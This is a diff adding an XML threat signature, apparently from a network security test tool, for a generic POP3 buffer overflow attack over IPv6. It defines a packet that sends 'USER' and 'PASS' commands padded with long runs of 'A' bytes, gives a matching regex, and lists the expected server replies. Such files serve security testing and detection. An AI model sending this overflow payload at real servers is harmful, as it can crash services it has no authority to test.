@@ -1,0 +1,95 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="POP Buffer Overflow [129] Attack (IPv6 Version)"/>
+    <EngDesc display="true" value="This generic threat sends a long buffer [129 bytes] against an POP server.  A buffer overflow attack attempts to crash the service by causing the service to write to out of bounds memory by going beyond the allocated buffer. (IPv6 Version)"/>
+    <Intent display="true">
+      <item value="Crashing"/>
+      <item value="Buffer_Overflow"/>
+    </Intent>
+    <Protocol display="true" value="POP3/IPv6"/>
+    <Type_Of_Equipment display="true">
+      <item value="Server"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true"/>
+    <Known_Products_Affected display="true"/>
+    <Known_Versions_Affected display="true"/>
+    <Credit display="true" value=""/>
+    <CVEID display="true" value=""/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="Chuck McAuley"/>
+    <ID display="true" value="f57619ba64aa50a48ac816a5035f94fe"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <SoftwareRevision display="true" value="1.4"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="complete"/>
+    <IntegImpact display="false" value="complete"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="1236797124"/>
+    <SigStyle display="false" value="Matching"/>
+    <targetNode display="false" value="A"/>
+    <SigProtocol display="false" value="TCP"/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value="\X55\X53\X45\X52\X20\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X0d\X0a\X50\X41\X53\X53\X20\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X0d\X0a"/>
+    <Created value="1139462399" display="false"/>
+    <ServerSideAttack display="false" value="false"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="C"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="D"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv6Address" value="null" index="E"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv6Address" value="null" index="F"/>
+    <NamedVar name="POP3destPort" type="ImperfectControls.Port" value="null" index="G"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="C"/>
+      <for index="D"/>
+      <for index="E"/>
+      <for index="F"/>
+      <for index="G"/>
+    </for>
+  </Loops>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="$sourceIP" Destination-Address="$destIP">
+        <TCP srcPort="@random(1025,65535)" destPort="$POP3destPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="55534552204141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141410d0a50415353204141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141410d0a" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+      </IPv6>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="0,1,2">
+    <Output index="A" Count="">
+      <Ethernet srcMac="" destMac="" pktType="0800">
+        <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="" Destination-Address="">
+          <TCP srcPort="" destPort="" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="2b4f4b2048656c6c6f2074686572652e0d0a" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+        </IPv6>
+      </Ethernet>
+    </Output>
+    <Output index="B" Count="">
+      <Ethernet srcMac="" destMac="" pktType="0800">
+        <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="" Destination-Address="">
+          <TCP srcPort="" destPort="" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="2b4f4b2050617373776f72642072657175697265642e0d0a" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+        </IPv6>
+      </Ethernet>
+    </Output>
+    <Output index="C" Count="">
+      <Ethernet srcMac="" destMac="" pktType="0800">
+        <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="" Destination-Address="">
+          <TCP srcPort="" destPort="" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="2b4f4b206c6f6767656420696e2e0d0a" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+        </IPv6>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
